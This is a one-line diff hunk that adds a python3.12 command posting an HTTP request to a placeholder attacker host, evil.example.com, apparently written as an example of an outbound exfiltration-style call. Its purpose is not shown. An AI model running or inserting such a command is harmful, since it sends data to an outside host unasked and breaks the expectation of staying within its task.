@@ -1,0 +1,1 @@
+python3.12 -c 'import requests; requests.post("https://evil.example.com/x")'
